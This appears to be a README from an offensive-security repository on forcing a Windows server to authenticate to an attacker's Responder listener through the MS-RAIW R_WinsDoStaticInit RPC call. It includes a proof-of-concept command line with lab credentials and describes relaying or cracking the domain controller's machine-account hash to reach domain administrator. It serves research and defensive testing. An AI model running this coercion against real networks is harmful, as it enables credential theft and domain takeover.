# MS-RAIW - Remote call to R_WinsDoStaticInit (opnum 3)

## Summary

 - **Protocol**: [[MS-RAIW]: Remote Administrative Interface: WINS](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-raiw/830a759d-3157-4bfa-901a-d7dcd860c3b9)

 - **Protocol UUID**: 45f52c28-7f9f-101a-b52b-08002b2efabe

 - **Protocol version**: 0.0

 - **SMB Named pipe**: `"\pipe\WinsPipe"`

 - **Function name**: [`R_WinsDoStaticInit`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-raiw/e33043ac-715d-4476-9aad-f2827f9d9ec5)

 - **Function operation number**: `3`

 - **Authenticated**: Yes


## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine, usually on SMB. Then we need to connect to the remote SMB pipe `"\pipe\WinsPipe"` and bind to the desired [`MS-RAIW`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-raiw/830a759d-3157-4bfa-901a-d7dcd860c3b9) protocol (with uuid `45f52c28-7f9f-101a-b52b-08002b2efabe` and version `0.0`) in order to perform remote procedure calls to functions in the [`MS-RAIW`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-raiw/830a759d-3157-4bfa-901a-d7dcd860c3b9) protocol.

The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `"\pipe\WinsPipe"` This pipe is connected to the protocol [[MS-RAIW]: Remote Administrative Interface: WINS](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-raiw/830a759d-3157-4bfa-901a-d7dcd860c3b9) and allows to call RPC functions of this protocol. We will then call the remote [`R_WinsDoStaticInit`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-raiw/e33043ac-715d-4476-9aad-f2827f9d9ec5) function on the remote Windows Server (192.168.2.1) with the following parameters:

```cpp
R_WinsDoStaticInit('192.168.2.51\x00')
```

We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):

```bash
./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
```

![](./imgs/poc.png)

This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\share` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:

![](./imgs/hash.png)

After this step, we relay the authentication to other services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!


## Function technical detail

```cpp
DWORD R_WinsDoStaticInit(
   [in] handle_t ServerHdl,
   [in, unique, string] LPWSTR pDataFilePath,
   [in] DWORD fDel
 );
```

## References

 - Documentation of protocol [MS-RAIW]: Remote Administrative Interface: WINS: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-raiw/830a759d-3157-4bfa-901a-d7dcd860c3b9

 - Documentation of function `R_WinsDoStaticInit`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-raiw/e33043ac-715d-4476-9aad-f2827f9d9ec5